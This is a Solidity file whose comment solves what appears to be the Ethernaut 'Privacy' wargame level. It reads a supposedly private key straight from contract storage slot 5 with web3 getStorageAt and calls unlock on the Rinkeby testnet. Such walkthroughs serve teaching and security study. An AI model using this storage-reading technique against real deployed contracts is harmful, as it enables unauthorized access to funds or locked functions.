/* according to Solidity docs https://docs.soliditylang.org/en/v0.8.6/internals/layout_in_storage.html
 the state variables will be in the following addresses :

0 - locked
1 - ID
2 - flattening,denomination,awkwardness
3 - data[0]
4 - data[1]
5 - data[2]


# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# the key is the first 16 bytes of data[2] , refer to Solidity Doc https://docs.soliditylang.org/en/v0.8.6/types.html#address  (Warning box)

key = web3.eth.getStorageAt("PrivacyContractAddress",5)[0:16]

# call unlock

pr_contract = interface.Privacy("PirvacyAddress")
pr_contract.unlock(key,{'from': a[0]})

# confirm unlocked 

web3.eth.getStorageAt("PrivacyContractAddress",0)

# submit

*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;

interface Privacy {

    function unlock(bytes16 _key) external;
}